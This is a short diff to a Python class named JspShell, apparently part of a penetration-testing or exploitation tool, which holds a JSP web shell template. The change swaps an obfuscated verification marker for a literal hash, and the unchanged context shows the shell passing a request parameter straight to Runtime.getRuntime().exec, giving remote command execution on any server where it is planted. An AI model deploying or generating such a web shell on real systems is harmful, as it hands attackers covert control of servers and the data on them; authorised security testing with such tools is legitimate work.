@@ -9,7 +9,7 @@ class JspShell(Webshell):
     _content = '<%@ page import="java.util.*,java.io.*"%>\n' \
                '<%\n' \
                'if (request.getParameter("check") == "1")\n' \
-               '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");\n' \
+               '    out.println("595bb9ce8726b4b55f538d3ca0ddfd76");\n' \
                'if (request.getParameter("{0}") != null)\n' \
                '{{\n' \
                '    Process p = Runtime.getRuntime().exec(request.getParameter("{1}"));\n' \
